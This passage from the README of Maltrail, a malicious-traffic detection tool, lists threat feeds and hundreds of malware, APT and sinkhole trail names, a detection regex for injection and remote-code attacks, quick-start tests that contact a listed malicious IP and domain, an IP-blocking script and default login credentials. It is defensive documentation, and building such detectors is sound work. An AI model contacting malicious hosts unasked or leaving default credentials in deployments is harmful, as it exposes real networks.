(e.g. `185.130.5.231` for known attacker) or HTTP User-Agent header value (e.g. `sqlmap` for automatic SQL injection and database takeover tool). Also, it uses (optional) advanced heuristic mechanisms that can help in discovery of unknown threats (e.g. new malware).\\n\\n![Reporting tool](https://i.imgur.com/Sd9eqoa.png)\\n\\nThe following (black)lists (i.e. feeds) are being utilized:\\n\\n```\\n360chinad, 360conficker, 360cryptolocker, 360gameover, 360locky, 360necurs, \\n360tofsee, 360virut, abuseipdb, alienvault, atmos, badips, \\nbambenekconsultingc2dns, bambenekconsultingdga, bitcoinnodes, blackbook, \\nblocklist, botscout, bruteforceblocker, ciarmy, cobaltstrike, cruzit, \\ncybercrimetracker, dataplane, dshielddns, dshieldip, emergingthreatsbot, \\nemergingthreatscip, emergingthreatsdns, feodotrackerip, greensnow, loki, \\nmalc0de, malwaredomainlistdns, malwaredomains, maxmind, minerchk, myip, \\nopenphish, palevotracker, policeman, pony, proxylists, proxyrss, proxyspy, \\nransomwaretrackerdns, ransomwaretrackerip, ransomwaretrackerurl, riproxies, \\nrutgers, sblam, socksproxy, sslbl, sslproxies, talosintelligence, torproject, \\ntrickbot, turris, urlhaus, urlvir, vxvault, zeustrackermonitor, zeustrackerurl,\\netc.\\n```\\n\\nAs of static entries, the trails for the following malicious entities (e.g. malware C&Cs or sinkholes) have been manually included (from various AV reports and personal research):\\n\\n```\\n404, 9002, aboc, ab, acbackdoor, acridrain, activeagent, advisorbot, adwind, \\nadylkuzz, adzok, afrodita, agaadex, agenttesla, aldibot, alina, allakore, \\nalmalocker, almashreq, alpha, alureon, amadey, amavaldo, amend_miner, ammyyrat, \\nandroid_acecard, android_adrd, android_alienspy, android_anubis, \\nandroid_arspam, android_asacub, android_backflash, android_bankbot, \\nandroid_bankun, android_basbanke, android_basebridge, android_besyria, \\nandroid_boxer, android_buhsam, android_busygasper, android_callerspy, \\nandroid_camscanner, android_cerberus, android_chuli, android_claco, \\nandroid_clickfraud, android_cometbot, android_coolreaper, android_copycat, \\nandroid_counterclank, android_cyberwurx, android_dendoroid, android_dougalek, \\nandroid_droidjack, android_droidkungfu, android_enesoluty, android_ewalls, \\nandroid_ewind, android_exodus, android_exprespam, android_fakeapp, \\nandroid_fakebanco, android_fakedown, android_fakeinst, android_fakelog, \\nandroid_fakemart, android_fakemrat, android_fakeneflic, android_fakesecsuit, \\nandroid_fanta, android_feabme, android_flexispy, android_fraudbot, \\nandroid_frogonal, android_funkybot, android_geinimi, android_generic, \\nandroid_geost, android_ghostpush, android_ginmaster, android_gmaster, \\nandroid_godwon, android_golddream, android_goldencup, android_golfspy, \\nandroid_gonesixty, android_gplayed, android_gustuff, android_henbox, \\nandroid_hiddad, android_ibanking, android_joker, android_jsmshider, \\nandroid_kbuster, android_kemoge, android_lockdroid, android_lotoor, \\nandroid_lovetrap, android_malbus, android_maxit, android_mobstspy, \\nandroid_monokle, android_notcompatible, android_oneclickfraud, android_opfake, \\nandroid_ozotshielder, android_pikspam, android_pjapps, android_qdplugin, \\nandroid_ransomware, android_redalert, android_remotecode, android_repane, \\nandroid_riltok, android_roamingmantis, android_roidsec, android_rotexy, \\nandroid_samsapo, android_sandrorat, android_selfmite, android_shadowvoice, \\nandroid_shopper, android_simbad, android_simplocker, android_skullkey, \\nandroid_sndapps, android_spytekcell, android_stels, android_swanalitics, \\nandroid_teelog, android_telerat, android_tetus, android_tonclank, \\nandroid_torec, android_triada, android_uracto, android_usbcleaver, \\nandroid_viceleaker, android_walkinwat, android_windseeker, android_wirex, \\nandroid_xavirad, android_xhelper, android_zertsecurity, android_ztorg, \\nandromeda, antefrigus, antibot, anubis, anuna, apt_01, apt_09, apt_12, apt_17, \\napt_18, apt_23, apt_30, apt_33, apt_37, apt_38, apt_aridviper, apt_babar, \\napt_bahamut, apt_barium, apt_bisonal, apt_bitter, apt_blacktech, \\napt_blindeagle, apt_blueprint, apt_bookworm, apt_buhtrap, apt_calypso, \\napt_careto, apt_casper, apt_cdt, apt_chafer, apt_charmingkitten, apt_cleaver, \\napt_cloudatlas, apt_cobaltdickens, apt_commentcrew, apt_copykittens, \\napt_cosmicduke, apt_cyberbit, apt_darkhotel, apt_darkhydrus, apt_deadlykiss, \\napt_deeppanda, apt_desertfalcon, apt_dnspionage, apt_docless, \\napt_domestickitten, apt_donot, apt_dragonok, apt_duke, apt_dustsquad, \\napt_energeticbear, apt_equationgroup, apt_evapiks, apt_ezq, \\napt_familiarfeeling, apt_finfisher, apt_flame, apt_fruityarmor, apt_gallmaker, \\napt_gamaredon, apt_gaza, apt_glasses, apt_goblinpanda, apt_goldenbird, \\napt_goldenrat, apt_goldmouse, apt_gorgon, apt_gothicpanda, apt_gref, \\napt_greyenergy, apt_groundbait, apt_group5, apt_hackingteam, apt_hermit, \\napt_hogfish, apt_icefog, apt_innaput, apt_irn2, apt_irontiger, apt_ke3chang, \\napt_keyboy, apt_kimsuky, apt_lazarus, apt_leafminer, apt_lotusblossom, \\napt_luckymouse, apt_lyceum, apt_machete, apt_magichound, apt_menupass, \\napt_middleeast, apt_miniduke, apt_mudcarp, apt_muddywater, apt_mustangpanda, \\napt_naikon, apt_nettraveler, apt_newsbeef, apt_oceanlotus, apt_oilrig, \\napt_packrat, apt_patchwork, apt_pegasus, apt_pkplug, apt_platinum, \\napt_pokingthebear, apt_potao, apt_quarian, apt_quasar, apt_rancor, apt_reaper, \\napt_redbaldknight, apt_redoctober, apt_rnexus, apt_rocketman, apt_sandworm, \\napt_sauron, apt_scanbox, apt_scarcruft, apt_scarletmimic, apt_scieron, \\napt_sectora05, apt_shamoon, apt_shiqiang, apt_sidewinder, apt_silence, \\napt_simbaa, apt_snowman, apt_sobaken, apt_sofacy, apt_stealthfalcon, \\napt_stolenpencil, apt_stonedrill, apt_strongpity, apt_stuxnet, apt_ta2101, \\napt_ta428, apt_ta555, apt_tajmahal, apt_telebots, apt_tempperiscope, \\napt_temptingcedar, apt_tibet, apt_tick, apt_tortoiseshell, \\napt_transparenttribe, apt_turla, apt_tvrms, apt_unclassified, \\napt_volatilecedar, apt_weakestlink, apt_webky, apt_whitecompany, \\napt_wickedpanda, apt_windshift, apt_wirte, arcane, arec, ares, arkei, artro, \\naspire, asruex, astaroth, astrobot, asyncrat, athenagorat, atilla, \\natm_dispcash, atomlogger, attor, aurora, autoit, avalanche, avemaria, avrecon, \\naxpergle, azorult, babybot, babyshark, bachosens, backnet, badblock, badrabbit, \\nbalamid, baldr, balkanrat, bamital, bandook, bankapol, bankerflux, bankpatch, \\nbanload, banprox, banwarum, barys, bayrob, beamwinhttp, beapy, bebloh, bedep, \\nbeebone, belonard, betabot, bezigaterat, biskvit, bitpaymer, bitshifter, \\nblackmoon, blacknet, blacknixrat, blackrat, blackshades, blacksquid, blackworm, \\nblockbuster, bluebananarat, bluebot, bluecrab, bobax, bolek, bolik, bondat, \\nbondnet, borr, bot_mikrotik, bozokrat, bredolab, breut, brushaloader, bubnix, \\nbucriv, buer, bulehero, bunitu, buran, buterat, butter, cactustorch, calfbot, \\ncamerashy, cannibalrat, capturatela, carberp, cardinalrat, casbaneiro, \\nccleaner_backdoor, ceidpagelock, cerber, chainshot, changeup, chanitor, \\nchasebot, cheshire, chewbacca, chinachopper, chisbur, chthonic, cirenegrat, \\nclientmeshrat, clipsa, cloudatlas, coalabot, cobalt, cobint, cometer, \\nconficker, contopee, corebot, cotxrat, couponarific, criakl, cridex, crilock, \\ncrimsonrat, cryakl, crylocker, cryptbot, cryptfile2, cryptinfinite, \\ncryptodefense, cryptolocker, cryptowall, cryptxxx, ctblocker, cutwail, \\ncybergaterat, cythosia, dailyscriptlet, damoclis, danabot, dangerous, danji, \\ndarkcloud, darkcrystalrat, darkgate, darkrat, darkshell, darkware, dcrat, \\ndefru, delshad, denizkizi, deprimon, destory, dexter, dharma, diamondfoxrat, \\ndimnie, dircrypt, dirtjumper, dmalocker, dmsniff, dnsbirthday, dnschanger, \\ndnstrojan, dofoil, domen, dorifel, dorkbot, dorshel, dorv, drahma, drapion, \\ndridex, dropnak, dualtoy, dupzom, dursg, dyreza, elf_aidra, elf_amnesiark, \\nelf_billgates, elf_chalubo, elf_chinaz, elf_coinminer, elf_darlloz, \\nelf_ddosman, elf_dofloo, elf_ekoms, elf_emptiness, elf_evilgnome, elf_gafgyt, \\nelf_generic, elf_groundhog, elf_hacked_mint, elf_hajime, elf_hellobot, \\nelf_hiddenwasp, elf_hideseek, elf_httpsd, elf_iotreaper, elf_kaiten, \\nelf_kerberods, elf_lady, elf_mayhem, elf_mirai, elf_mokes, elf_mumblehard, \\nelf_openssh_backdoorkit, elf_pacha, elf_pasteminer, elf_pinscan, elf_qbot, \\nelf_ransomware, elf_rekoobe, elf_roboto, elf_routex, elf_shelldos, elf_skidmap, \\nelf_slexec, elf_sshdoor, elf_sshscan, elf_themoon, elf_torii, elf_tunpot, \\nelf_turla, elf_vpnfilter, elf_xbash, elf_xnote, elf_xorddos, elpman, emdivi, \\nemogen, emotet, empirerat, eredel, escelar, esfur, evilbunny, evilgrab, \\nevilnum, evoltinpos, evrial, expiro, fakben, fakeadobe, fakeav, fakeran, \\nfantom, fareit, farseer, fastloader, fbi_ransomware, felixhttp, fiexp, \\nfignotok, filespider, fin4, fin6, fin7, fin8, fin9, finderbot, findpos, floxif, \\nfnumbot, fobber, formbook, fox, frankenstein, fraudload, fruitfly, ftcode, \\nfudcrypt, fynloski, fysna, gamapos, gandcrab, gaudox, gauss, gbot, generic, \\ngermanwiper, gh0strat, ghostdns, ghost_miner, glitchpos, globeimposter, \\nglupteba, gobotkr, gobrut, godzilla, goldbrute, golroted, gootkit, grandoreiro, \\ngrand, gravityrat, greamerat, gruntstager, gtbot, guildma, hacking_team, \\nharnig, hawkball, hawkeye, helompy, heodo, hiddenbeer, hiddenbee, hiddencobra, \\nhiddentear, hiloti, hinired, hisoka, hollow_miner, honeybee, hoplight, houdini, \\nhuntpos, hvncrat, hydracrypt, hydseven, icedid, imminentrat, immortal, \\ninfinityrat, injecto, innfirat, investimer, invisimole, ios_keyraider, \\nios_muda, ios_oneclickfraud, ios_realtimespy, ios_specter, ios_xcodeghost, \\niron, ismdoor, isodisk, ispy, isr, jackpos, jacksbot, jasperloader, javarat, \\njigsaw, jrat, jripbot, jsoutprox, jssloader, karkoff, kasidet, kazy, kbot, \\nkegotip, keitaro, kelihos, keybase, khrat, killrabbit, killua, king_miner, \\nkingslayer, kjw0rm, kolab, konni, koobface, korgo, korplug, kovter, kpot, \\nkradellsh, kromagent, kronos, krown, krugbot, krypton, kuago_miner, kulekmoko, \\nl0rdix, ladon, lampion, latentbot, legion_loader, limerat, litehttp, \\nloadpcbanker, lockbit, locked, locky, loda, lokibot, lollipop, loocipher, \\nloopbackrat, lostdoorrat, loud_miner, lucifer, luckycat, lucky, \\nluminositylinkrat, luoxk, luxnetrat, mado_miner, magicpos, magniber, majikpos, \\nmambashim, mamo, manabot, mancsyn, mandaph, maplebot, marap, mariposa, \\nmarmoolak, marsjoke, marut, masad, mastermana, matrix, matsnu, maze, mdrop, \\nmebroot, medbot, medusahttp, megacortex, megalodonhttprat, megaopac, megumin, \\nmekotio, mercurybot, mestep, metamorfo, midie, milkyboy, millionware, minedoor, \\nminotaur, misogow, mispadu, miuref, modirat, modpos, monero_backdoor, \\nmonsterinstall, moonlight, moreeggs, morto, morty, mozart, muhstik, \\nmysticalnet, nampohyu, nanocore, nbot, necurs, neko, nemeot, nemty, nemucod, \\nneonwallet, neshuta, nestrat, netsupport, netwire, neutrinopos, newddosbot, \\nnewpos, nexlogger, ngioweb, nigelthorn, nionspy, nitol, nivdort, njrat, \\nnodersok, nonbolqu, notpetya, notrobin, novaloader, novel_miner, novobot, \\nnovter, nozelesn, nucleartor, nuqel, nwt, nymaim, nymeria, obliquerat, odcodc, \\noficla, onkods, optima, orcusrat, oski, ostap, osx_bundlore, osx_coinminer, \\nosx_coldroot, osx_generic, osx_gmera, osx_imuler, osx_keranger, osx_keydnap, \\nosx_linker, osx_lol, osx_loselose, osx_macspy, osx_mami, osx_mokes, \\nosx_mughthesec, osx_proton, osx_salgorea, osx_shlayer, osx_trikster, \\nosx_wirelurker, padcrypt, pandabanker, paradoxrat, parallax, parasitehttprat, \\npatchbrowse, paycrypt, pcastle, pcshare, pdfjsc, pepperat, peppyrat, \\nperl_shellbot, perseusrat, petya, pghost, phoenix, phorpiex, photo_miner, \\nphpstudyghost, phytob, picgoo, pift, pinkslipbot, pipka, piratematryoshka, \\npiritebot, plasmarat, plead, plugx, plurox, poisonivy, poisonrat, ponmocup, \\nposhcoder, pots, powelike, powerpool, powershell_injector, predatory, proced, \\npropagate, prorat, proslikefan, prostoclipper, prostoloader, protonbot, prowli, \\nproxyback, psixbot, punisherrat, pupyrat, purplefox, pushdo, pykspa, pyleet, \\npylocky, pypi_backdoor, pyrogenic, python_brost, python_injector, python_xwo, \\npyxierat, qakbot, qeallerrat, qrat, quadagent, quantloader, quasarrat, qulab, \\nqwertminer, raasberry, raccoon, ragnarok, rajump, rakhni, ramdo, ramnit, \\nranion, ransirac, ransomed, rarog, razy, reactorbot, reaver, redaman, \\nrediswannamine, redsip, reductor, remcos, remexirat, renocide, revcoderat, \\nrevengerat, reveton, revetrat, rincux, rmsrat, rombertik, rovnix, rozena, rtm, \\nrubella, ruby_backdoor, ruftar, runforestrun, rustock, ryuk, saefkorat, sage, \\nsakabota, sakari, sakurel, sality, samsam, sanny, satana, sathurbot, scanbox, \\nscarcruft, scranos, sdbot, seaduke, sectoprat, sefnit, selfdel, severe, \\nshadownet, shadowtechrat, shelma, shifu, shimrat, shiotob, shurl0ckr, shylock, \\nsiesta, silentbrute, silly, simda, sinkhole_360netlab, sinkhole_abuse, \\nsinkhole_arbor, sinkhole_bitdefender, sinkhole_bitsight, sinkhole_blacklab, \\nsinkhole_bomccss, sinkhole_botnethunter, sinkhole_certgovau, sinkhole_certpl, \\nsinkhole_changeip, sinkhole_checkpoint, sinkhole_cirtdk, sinkhole_cncert, \\nsinkhole_collector, sinkhole_conficker, sinkhole_cryptolocker, \\nsinkhole_dnssinkhole, sinkhole_doombringer, sinkhole_drweb, sinkhole_dynadot, \\nsinkhole_dyre, sinkhole_farsight, sinkhole_fbizeus, sinkhole_fireeye, \\nsinkhole_fitsec, sinkhole_fnord, sinkhole_fraunhofer, sinkhole_gamaredon, \\nsinkhole_gameoverzeus, sinkhole_georgiatech, sinkhole_gladtech, sinkhole_hyas, \\nsinkhole_infosecjp, sinkhole_kaspersky, sinkhole_kryptoslogic, \\nsinkhole_menupass, sinkhole_microsoft, sinkhole_noip, sinkhole_nowdns, \\nsinkhole_oceanlotus, sinkhole_opendns, sinkhole_rsa, sinkhole_secureworks, \\nsinkhole_securityscorecard, sinkhole_shadowserver, sinkhole_sidnlabs, \\nsinkhole_sinkdns, sinkhole_sobaken, sinkhole_sofacy, sinkhole_spamandabuse, \\nsinkhole_sugarbucket, sinkhole_supportintel, sinkhole_switch, sinkhole_tech, \\nsinkhole_torpig, sinkhole_tsway, sinkhole_turla, sinkhole_unknown, \\nsinkhole_vicheck, sinkhole_virustracker, sinkhole_vittalia, \\nsinkhole_wapacklabs, sinkhole_xaayda, sinkhole_yourtrap, sinkhole_zinkhole, \\nskeeyah, skidrat, skynet, skyper, slenfbot, sload, slserver, smallnetrat, \\nsmokebot, smokeloader, smominru, smsfakesky, snatch, snifula, snslocker, \\nsockrat, sodinokibi, sohanad, sonoko, sorano, spideybot, spybotpos, spyeye, \\nspygaterat, stabuniq, stantinko, stealzilla, strictor, supremebot, surtr, \\nsusafone, svproxy, swamprat, symmi, syndicasec, synolocker, syscon, sysrat, \\nsystembc, systemd_miner, sysworm, t1087, ta505, tables, taskmasters, tdss, \\nteambot, teamspy, teerac, telebots, telegrab, terracotta, teslacrypt, tflower, \\ntinba, tinynuke, tinypos, tofsee, tor_backdoor, torpig, torrentlocker, \\ntovkater, travle, treasurehunter, trickbot, troldesh, tron, tscookie, tuhkit, \\ntupym, turkojanrat, tvrat, tvspy, udpos, unruy, up007, upatre, urausy, urlzone, \\nursnif, vaimalandra, varenyky, vawtrak, vbcheman, vbrat, vidar, viknok, \\nvinderuf, virobot, virtum, virusrat, virut, vittalia, vjw0rm, vobfus, \\nvssdestroy, vundo, wacatac, waledac, wallyshack, wannacry, wannamine, waprox, \\nwarezov, webcobra, wecorl, wecoym, weecnaw, whiteshadow, wildfire, winnti, \\nwndred, wofeksad, wolfresearch, wp-vcd, xadupi, xenotix, xpay, xshark, xtbl, \\nxtrat, yenibot, yimfoca, yoursqldumps, zaletelly, zcrypt, zegost, zemot, \\nzeroaccess, zeropadypt, zeus, zherotee, zlader, zloader, zlob, zombieboy, \\nzombrari, zonidel, zusy, zxshell, zyklon, etc.\\n```\\n\\n## Architecture\\n\\nMaltrail is based on the **Traffic** -&gt; **Sensor** &lt;-&gt; **Server** &lt;-&gt; **Client** architecture. **Sensor**(s) is a standalone component running on the monitoring node (e.g. Linux platform connected passively to the SPAN/mirroring port or transparently inline on a Linux bridge) or at the standalone machine (e.g. Honeypot) where it \\\"monitors\\\" the passing **Traffic** for blacklisted items/trails (i.e. domain names, URLs and/or IPs). In case of a positive match, it sends the event details to the (central) **Server** where they are being stored inside the appropriate logging directory (i.e. `LOG_DIR` described in the *Configuration* section). If **Sensor** is being run on the same machine as **Server** (default configuration), logs are stored directly into the local logging directory. Otherwise, they are being sent via UDP messages to the remote server (i.e. `LOG_SERVER` described in the *Configuration* section).\\n\\n![Architecture diagram](https://i.imgur.com/2IP9Mh2.png)\\n\\n**Server**'s primary role is to store the event details and provide back-end support for the reporting web application. In default configuration, server and sensor will run on the same machine. So, to prevent potential disruptions in sensor activities, the front-end reporting part is based on the [\\\"Fat client\\\"](https://en.wikipedia.org/wiki/Fat_client) architecture (i.e. all data post-processing is being done inside the client's web browser instance). Events (i.e. log entries) for the chosen (24h) period are transferred to the **Client**, where the reporting web application is solely responsible for the presentation part. Data is sent toward the client in compressed chunks, where they are processed sequentially. The final report is created in a highly condensed form, practically allowing presentation of virtually unlimited number of events.\\n\\nNote: **Server** component can be skipped altogether, and just use the standalone **Sensor**. In such case, all events would be stored in the local logging directory, while the log entries could be examined either manually or by some CSV reading application.\\n\\n## Quick start\\n\\nThe following set of commands should get your Maltrail **Sensor** up and running (out of the box with default settings and monitoring interface \\\"any\\\"):\\n\\n- For **Debian/Ubuntu**\\n\\n```\\nsudo apt-get install git python-pcapy\\ngit clone --depth 1 https://github.com/stamparm/maltrail.git\\ncd maltrail\\nsudo python sensor.py\\n```\\n\\n- For **SUSE/openSUSE**\\n\\n```\\nsudo zypper install gcc gcc-c++ git libpcap-devel python-devel python2-pip\\nsudo pip2 install pcapy\\ngit clone --depth 1 https://github.com/stamparm/maltrail.git\\ncd maltrail\\nsudo python sensor.py\\n```\\n\\n![Sensor](https://i.imgur.com/E9tt2ek.png)\\n\\nTo start the (optional) **Server** on same machine, open a new terminal and execute the following:\\n\\n```\\n[[ -d maltrail ]] || git clone --depth 1 https://github.com/stamparm/maltrail.git\\ncd maltrail\\npython server.py\\n```\\n\\n![Server](https://i.imgur.com/loGW6GA.png)\\n\\nTo test that everything is up and running execute the following:\\n\\n```\\nping -c 1 136.161.101.53\\ncat /var/log/maltrail/$(date +\\\"%Y-%m-%d\\\").log\\n```\\n\\n![Test](https://i.imgur.com/NYJg6Kl.png)\\n\\nAlso, to test the capturing of DNS traffic you can try the following:\\n\\n```\\nnslookup morphed.ru\\ncat /var/log/maltrail/$(date +\\\"%Y-%m-%d\\\").log\\n```\\n\\n![Test2](https://i.imgur.com/62oafEe.png)\\n\\nTo stop **Sensor** and **Server** instances (if running in background) execute the following:\\n\\n```\\nsudo pkill -f sensor.py\\npkill -f server.py\\n```\\n\\nAccess the reporting interface (i.e. **Client**) by visiting the http://127.0.0.1:8338 (default credentials: `admin:changeme!`) from your web browser:\\n\\n![Reporting interface](https://i.imgur.com/VAsq8cs.png)\\n\\n## Administrator's guide\\n\\n### Sensor\\n\\nSensor's configuration can be found inside the `maltrail.conf` file's section `[Sensor]`:\\n\\n![Sensor's configuration](https://i.imgur.com/8yZKH14.png)\\n\\nIf option `USE_MULTIPROCESSING` is set to `true` then all CPU cores will be used. One core will be used only for packet capture (with appropriate affinity, IO priority and nice level settings), while other cores will be used for packet processing. Otherwise, everything will be run on a single core. Option `USE_FEED_UPDATES` can be used to turn off the trail updates from feeds altogether (and just use the provided static ones). Option `UPDATE_PERIOD` contains the number of seconds between each automatic trails update (Note: default value is set to `86400` (i.e. one day)) by using definitions inside the `trails` directory (Note: both **Sensor** and **Server** take care of the trails update). Option `CUSTOM_TRAILS_DIR` can be used by user to provide location of directory containing the custom trails (`*.txt`) files.\\nOption `USE_HEURISTICS` turns on heuristic mechanisms (e.g. `long domain name (suspicious)`, `excessive no such domain name (suspicious)`, `direct .exe download (suspicious)`, etc.), potentially introducing false positives. Option `CAPTURE_BUFFER` presents a total memory (in bytes of percentage of total physical memory) to be used in case of multiprocessing mode for storing packet capture in a ring buffer for further processing by non-capturing processes. Option `MONITOR_INTERFACE` should contain the name of the capturing interface. Use value `any` to capture from all interfaces (if OS supports this). Option `CAPTURE_FILTER` should contain the network capture (`tcpdump`) filter to skip the uninteresting packets and ease the capturing process. Option `SENSOR_NAME` contains the name that should be appearing inside the events `sensor_name` value, so the event from one sensor could be distinguished from the other. If option `LOG_SERVER` is set, then all events are being sent remotely to the **Server**, otherwise they are stored directly into the logging directory set with option `LOG_DIR`, which can be found inside the `maltrail.conf` file's section `[All]`. In case that the option `UPDATE_SERVER` is set, then all the trails are being pulled from the given location, otherwise they are being updated from trails definitions located inside the installation itself.\\n\\nWhen running the sensor (e.g. `sudo python sensor.py`) for the first time and/or after a longer period of non-running, it will automatically update the trails from trail definitions (Note: stored inside the `trails` directory). After the initialization, it will start monitoring the configured interface (option `MONITOR_INTERFACE` inside the `maltrail.conf`) and write the events to either the configured log directory (option `LOG_DIR` inside the `maltrail.conf` file's section `[All]`) or send them remotely to the logging/reporting **Server** (option `LOG_SERVER`).\\n\\n![Sensor run](https://i.imgur.com/A0qROp8.png)\\n\\nDetected events are stored inside the **Server**'s logging directory (i.e. option `LOG_DIR` inside the `maltrail.conf` file's section `[All]`) in easy-to-read CSV format (Note: whitespace ' ' is used as a delimiter) as single line entries consisting of: `time` `sensor` `src_ip` `src_port` `dst_ip` `dst_port` `proto` `trail_type` `trail` `trail_info` `reference` (e.g. `\\\"2015-10-19 15:48:41.152513\\\" beast 192.168.5.33 32985 8.8.8.8 53 UDP DNS 0000mps.webpreview.dsl.net malicious siteinspector.comodo.com`):\\n\\n![Sample log](https://i.imgur.com/RycgVru.png)\\n\\n### Server\\n\\nServer's configuration can be found inside the `maltrail.conf` section `[Server]`:\\n\\n![Server's configuration](https://i.imgur.com/TiUpLX8.png)\\n\\nOption `HTTP_ADDRESS` contains the web server's listening address (Note: use `0.0.0.0` to listen on all interfaces). Option `HTTP_PORT` contains the web server's listening port. Default listening port is set to `8338`. If option `USE_SSL` is set to `true` then `SSL/TLS` will be used for accessing the web server (e.g. `https://192.168.6.10:8338/`). In that case, option `SSL_PEM` should be pointing to the server's private/cert PEM file. \\n\\nSubsection `USERS` contains user's configuration settings. Each user entry consists of the `username:sha256(password):UID:filter_netmask(s)`. Value `UID` represents the unique user identifier, where it is recommended to use values lower than 1000 for administrative accounts, while higher value for non-administrative accounts. The part `filter_netmask(s)` represents the comma-delimited hard filter(s) that can be used to filter the shown events depending on the user account(s). Default entry is as follows:\\n\\n![Configuration users](https://i.imgur.com/PYwsZkn.png)\\n\\nOption `UDP_ADDRESS` contains the server's log collecting listening address (Note: use `0.0.0.0` to listen on all interfaces), while option `UDP_PORT` contains listening port value. If turned on, when used in combination with option `LOG_SERVER`, it can be used for distinct (multiple) **Sensor** <-> **Server** architecture.\\n\\nOption `FAIL2BAN_REGEX` contains the regular expression (e.g. `attacker|reputation|potential[^\\\"]*(web scan|directory traversal|injection|remote code)`) to be used in `/fail2ban` web calls for extraction of today's attacker source IPs. This allows the usage of IP blocking mechanisms (e.g. `fail2ban`, `iptables` or `ipset`) by periodic pulling of blacklisted IP addresses from remote location. Example usage would be the following script (e.g. run as a `root` cronjob on a minute basis):\\n\\n```\\n#!/bin/bash\\nipset -q flush maltrail\\nipset -q create maltrail hash:net\\nfor ip in $(curl http://127.0.0.1:8338/fail2ban 2>/dev/null | grep -P '^[0-9.]+$'); do ipset add maltrail $ip; done\\niptables -I INPUT -m set --match-set maltrail src -j DROP\\n```\\n\\n\\n\\nSame as for **Sensor**, when running the **Server** (e.g. `python server.py`) for the first time and/or after a longer period of non-running, if option `USE_SERVER_UPDATE_TRAILS` is set to `true`, it will automatically update the trails from trail definitions (Note: stored inside the `trails` directory). Its basic function is to store the log entries inside the logging directory (i.e. option `LOG_DIR` inside the `maltrail.conf` file's section `[All]`) and provide the web reporting interface for presenting those same entries to the end-user (Note: there is no need install the 3rd party web server packages like Apache):\\n\\n![Server run](https://i.imgur.com/GHdGPw7.png)\\n\\n## User's guide\\n\\n### Reporting interface\\n\\nWhen entering the **Server**'s reporting interface (i.e. via the address defined by options `HTTP_ADDRESS` and `HTTP_PORT`), user will be presented with the following authentication dialog. User has to enter the proper credentials that have been set by the server's administrator inside the configuration file `maltrail.conf` (Note: default credentials are `admin:changeme!`):\\n\\n![User login](https://i.imgur.com/WVpASAI.png)\\n\\nOnce inside, user will be presented with the following reporting interface:\\n\\n![Reporting interface](https://i.imgur.com/PZY8JEC.png)\\n\\nThe top part holds a sliding timeline (Note: activated after clicking the current date label and/or the calendar icon ![Calendar icon](https://i.imgur.com/NfNore9.png)) where user can select logs for past events (Note: mouse over event will trigger display of tooltip with approximate number of events for current date). Dates are grouped by months, where 4 month period of data are displayed inside the widget itself. However, by using the provided slider (i.e. ![Timeline slider](https://i.imgur.com/SNGVSaP.png)) user can easily access events from previous months.\\n\\n![Timeline](https://i.imgur.com/RnIROcn.png)\\n\\nOnce clicking the date, all events for that particular date should be loaded and represented by the client's web browser. Depending on number of events and the network connection speed, loading and display of logged events could take from couple of seconds, up to several minutes (e.g. 100,000 events takes around 5 seconds in total). For the whole processing time, animated loader will be displayed across the disabled user interface:\\n\\n![Loader](https://i.imgur.com/oX7Rtjo.png)\\n\\nMiddle part holds a summary of displayed events. `Events` box represents total number of events in a selected 24-hour period, where red line represents IP-based events, blue line represents DNS-based events and yellow line represents URL-based events. `Sources` box represents number of events per top sources in form of a stacked column chart, with total number of sources on top. `Threats` box represents percentage of top threats in form of a pie chart (Note: gray area holds all threats having each &lt;1% in total events), with total number of threats on top. `Trails` box represents percentage of top trails in form of a pie chart (Note: gray area holds all trails having each &lt;1% in total events), with total number of trails on top. Each of those boxes are active, hence the click on one of those will result with a more detailed graph.\\n\\n![Summary](https://i.imgur.com/5NFbqCb.png)\\n\\nBottom part holds a condensed representation of logged events in form of a paginated table. Each entry holds details for a single threat (Note: uniquely identified by a pair `(src_ip, trail)` or `(dst_ip, trail)` if the `src_ip` is the same as the `trail` as in case of attacks coming from the outside):\\n\\n![Single threat](https://i.imgur.com/IxPwKKZ.png)\\n\\nColumn `threat` holds threat's unique ID (e.g. `85fdb08d`) and color (Note: extruded from the threat's ID), `sensor` holds sensor name(s) where the event has been triggered (e.g. `blitvenica`), `events` holds total number of events for a current threat, `severity` holds evaluated severity of threat (Note: calculated based on values in `info` and `reference` columns, prioritizing malware generated traffic), `first_seen` holds time of first event in a selected (24h) period (e.g. `06th 08:21:54`), `last_seen` holds time of last event in a selected (24h) period (e.g. `06th 15:21:23`), `sparkline` holds a small sparkline graph representing threat's activity in selected period, `src_ip` holds source IP(s) of a threat (e.g. `99.102.41.102`), `src_port` holds source port(s) (e.g. `44556, 44589, 44601`), `dst_ip` holds destination IP(s) (e.g. `213.202.100.28`), `dst_port` holds destination port(s) (e.g. `80 (HTTP)`), `proto` holds protocol(s), (e.g. `TCP`), `trail` holds a blacklisted (or heuristic) entry that triggered the event(s), `info` holds more information about the threat/trail (e.g. `known attacker` for known attacker's IP addresses or `ipinfo` for known IP information service commonly used by malware during a startup), `reference` holds a source of the blacklisted entry (e.g. `(static)` for static trails or `myip.ms` for a dynamic feed retrieved from that same source) and `tags` holds user defined tags for a given trail (e.g. `APT28`).\\n\\nWhen moving mouse over `src_ip` and `dst_ip` table entries, information tooltip is being displayed with detailed reverse DNS and WHOIS information (Note: [RIPE](http://www.ripe.net/) is the information provider):\\n\\n![On mouse over IP](https://i.imgur.com/BgKchAX.png)\\n\\nEvent details (e.g. `src_port`, `dst_port`, `proto`, etc.) that differ inside same threat entry are condensed in form of a bubble icon (i.e. ![Ellipsis](https://raw.githubusercontent.com/stamparm/maltrail/master/html/images/ellipsis.png)). This is performed to get an usable reporting interface with as less rows as possible. Moving mouse over such icon will result in a display of an information tooltip with all items held (e.g. all port numbers being scanned by `attacker`):\\n\\n![On mouse over bubble](https://i.imgur.com/BfYT2u7.png)\\n\\nClicking on one such icon will open a new dialog containing all stored items (Note: in their uncondensed form) ready to be Copy-Paste(d) for further analysis:\\n\\n![Ctrl-C dialog](https://i.imgur.com/9pgMpiR.png)\\n\\nWhen hovering mouse pointer over the threat's trail for couple of seconds it will result in a frame consisted of results using the trail as a search term performed against [DuckDuckGo](https://duckduckgo.com/) search engine. In lots of cases, this provides basic information about the threat itself, eliminating the need for user to do the manual search for it. In upper right corner of the opened frame window there are two extra buttons. By clicking the first one (i.e. ![New tab icon](https://raw.githubusercontent.com/stamparm/maltrail/master/html/images/newtab.png)), the resulting frame will be opened inside the new browser's tab (or window), while by clicking the second one (i.e. ![Close icon](https://raw.githubusercontent.com/stamparm/maltrail/master/html/images/close.png)) will immediately close the frame (Note: the same action is achieved by 